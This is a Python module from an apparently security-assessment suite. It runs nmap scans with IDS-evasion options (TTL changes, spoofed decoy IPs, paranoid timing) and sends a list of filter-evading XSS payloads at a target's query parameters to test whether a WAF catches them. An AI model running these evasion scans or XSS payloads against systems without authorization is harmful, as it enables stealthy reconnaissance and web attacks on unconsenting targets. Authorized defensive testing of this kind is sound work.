"""
NetProbe Security Suite - Evasion Module
Tools: nmap (TTL/decoy/timing), httpx (enc/poly)
"""
import os
import re
import shutil
from utils.raw_exec import raw_exec

MODULE_NAMES = {
    "ttl_manip":   "TTL Manipulation",
    "decoy_scan":  "Decoy Scanning",
    "timing_ev":   "Timing Evasion",
    "enc_payload": "Encrypted Payload",
    "poly_payload":"Polymorphic Payload",
}

TTL_VALUES = {1: "128", 2: "64", 3: "32", 4: "16", 5: "1"}
DECOYS     = {1: "5",   2: "10", 3: "20", 4: "50", 5: "100"}

POLY_PAYLOADS = [
    ("<script>alert(1)</script>",            "Original"),
    ("<SCRIPT>ALERT(1)</SCRIPT>",            "Uppercase"),
    ("<scr\x00ipt>alert(1)</scr\x00ipt>",   "Null byte"),
    ("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "HTML entities"),
    ("%3Cscript%3Ealert%281%29%3C%2Fscript%3E", "URL encoded"),
    ("<svg/onload=alert(1)>",                "SVG"),
    ("<img src=x onerror=alert`1`>",         "Template literal"),
    ("<<script>script>alert(1)<</script>/script>", "Double tag"),
]

async def run_evasion_module(module_id, target, intensity, duration, log_fn):
    name = MODULE_NAMES.get(module_id, module_id)
    await log_fn("MODULE", f"▶ {name}", module_id)
    runners = {
        "ttl_manip":   _ttl_manip,
        "decoy_scan":  _decoy_scan,
        "timing_ev":   _timing_evasion,
        "enc_payload": _enc_payload,
        "poly_payload":_poly_payload,
    }
    return await runners[module_id](target, intensity, log_fn)


async def _ttl_manip(target, intensity, log_fn):
    if not shutil.which("nmap"):
        await log_fn("WARN", "nmap no instalado: sudo apt install nmap", "ttl_manip")
        return {}, "ERROR", None

    ttl = TTL_VALUES.get(intensity, "64")
    cmd = f"nmap --ttl {ttl} -sS -p 22,80,443,8080,8443 -T3 {target}"
    out, err, rc = await raw_exec(cmd, log_fn, "ttl_manip", timeout=120)

    open_ports = re.findall(r"(\d+)/tcp\s+open\s*(\S*)", out)
    filtered   = re.findall(r"(\d+)/tcp\s+filtered", out)

    if open_ports:
        await log_fn("WARN", f"⚠️ Scan TTL={ttl} detectó {len(open_ports)} puertos abiertos — firewall no filtra TTL", "ttl_manip")
        return {"ttl_used": ttl, "open_ports": [{"port":p,"service":s} for p,s in open_ports]}, "DETECTED", 60
    if filtered:
        return {"ttl_used": ttl, "filtered_ports": filtered}, "BLOCKED", 100
    return {"ttl_used": ttl, "note": "Sin respuesta"}, "BLOCKED", 100


async def _decoy_scan(target, intensity, log_fn):
    if not shutil.which("nmap"):
        await log_fn("WARN", "nmap no instalado: sudo apt install nmap", "decoy_scan")
        return {}, "ERROR", None
    if os.geteuid() != 0:
        await log_fn("WARN", "Decoy scan requiere root para IP spoofing", "decoy_scan")
        return {}, "ERROR", None

    decoys = DECOYS.get(intensity, "20")
    cmd    = f"nmap -D RND:{decoys},ME -sS -p 22,80,443,3389,8080 -T3 {target}"
    out, err, rc = await raw_exec(cmd, log_fn, "decoy_scan", timeout=180)

    open_ports = re.findall(r"(\d+)/tcp\s+open\s*(\S*)", out)
    if open_ports:
        await log_fn("WARN", f"⚠️ Decoy scan ({decoys} señuelos) detectó puertos abiertos — IDS no filtró", "decoy_scan")
        return {"decoys_used": int(decoys), "open_ports": [{"port":p,"service":s} for p,s in open_ports]}, "DETECTED", 60
    return {"decoys_used": int(decoys), "open_ports": []}, "BLOCKED", 100


async def _timing_evasion(target, intensity, log_fn):
    if not shutil.which("nmap"):
        await log_fn("WARN", "nmap no instalado", "timing_ev")
        return {}, "ERROR", None

    # T0 = paranoid (5min entre probes), muy lento pero evasivo
    cmd = f"nmap -T0 -sS -p 22,80,443,8080 --max-retries 1 {target}"
    await log_fn("RAW", "Timing T0 (Paranoid): 5 minutos entre probes — muy evasivo\nEsto puede tardar bastante...", "timing_ev")
    out, err, rc = await raw_exec(cmd, log_fn, "timing_ev", timeout=400)

    open_ports = re.findall(r"(\d+)/tcp\s+open\s*(\S*)", out)
    if open_ports:
        await log_fn("WARN", f"⚠️ Timing T0 detectó puertos — IDS no detectó scan lento", "timing_ev")
        return {"timing": "T0_paranoid", "open_ports": [{"port":p,"service":s} for p,s in open_ports]}, "DETECTED", 60
    return {"timing": "T0_paranoid", "open_ports": []}, "BLOCKED", 100


async def _enc_payload(target, intensity, log_fn):
    """Test TLS/HTTPS ports — encrypted payloads bypass deep packet inspection."""
    try:
        import httpx
    except ImportError:
        await log_fn("WARN", "httpx no instalado: pip install httpx", "enc_payload")
        return {}, "ERROR", None

    ports = [443, 8443, 4433, 9443]
    results = {"tls_ports": [], "bypassed": False, "details": []}

    for port in ports:
        url = f"https://{target}:{port}/"
        await log_fn("CMD", f"curl -sk --http2 {url}", "enc_payload")
        try:
            async with httpx.AsyncClient(verify=False, timeout=8, http2=True) as client:
                r = await client.get(url)
                detail = {"port": port, "status": r.status_code, "tls": True,
                          "http2": r.http_version == "HTTP/2"}
                results["tls_ports"].append(port)
                results["details"].append(detail)
                await log_fn("RAW", f"https://{target}:{port}/ → HTTP {r.status_code} | TLS: ✓ | HTTP/2: {detail['http2']}", "enc_payload")
                if r.status_code < 400:
                    results["bypassed"] = True
        except Exception as e:
            await log_fn("RAW", f"https://{target}:{port}/ → {type(e).__name__}: {e}", "enc_payload")

    if results["bypassed"]:
        await log_fn("WARN", f"⚠️ TLS endpoints accesibles — DPI puede no inspeccionar tráfico cifrado", "enc_payload")
        return results, "PARTIAL", 35
    return results, "BLOCKED", 100


async def _poly_payload(target, intensity, log_fn):
    """Test polymorphic XSS payloads — checks if WAF/filter catches mutations."""
    try:
        import httpx
    except ImportError:
        await log_fn("WARN", "httpx no instalado: pip install httpx", "poly_payload")
        return {}, "ERROR", None

    found = []
    await log_fn("CMD", f"httpx polymorphic XSS mutations → http://{target}/?q=<payload>", "poly_payload")

    async with httpx.AsyncClient(verify=False, timeout=8) as client:
        for payload, name in POLY_PAYLOADS:
            for param in ["q", "s", "search", "input"]:
                try:
                    r = await client.get(f"http://{target}/", params={param: payload})
                    reflected = payload.lower() in r.text.lower()
                    blocked   = r.status_code in [403, 406, 429] or "blocked" in r.text.lower()
                    await log_fn("RAW", f"[{name}] ?{param}={payload[:40]!r}\n  → HTTP {r.status_code} | reflected={reflected} | blocked={blocked}", "poly_payload")
                    if reflected and not blocked:
                        found.append({"name": name, "param": param, "payload": payload})
                        await log_fn("WARN", f"🚨 Mutación sin filtrar: [{name}]", "poly_payload")
                        break
                except Exception as e:
                    await log_fn("RAW", f"[{name}] Error: {e}", "poly_payload")

    await log_fn("RAW", f"\nResumen: {len(found)}/{len(POLY_PAYLOADS)} mutaciones sin filtrar", "poly_payload")
    if found:
        return {"vulnerable": True, "unfiltered_mutations": len(found), "details": found[:5]}, "PASSED", 0
    return {"vulnerable": False, "all_filtered": True}, "BLOCKED", 100
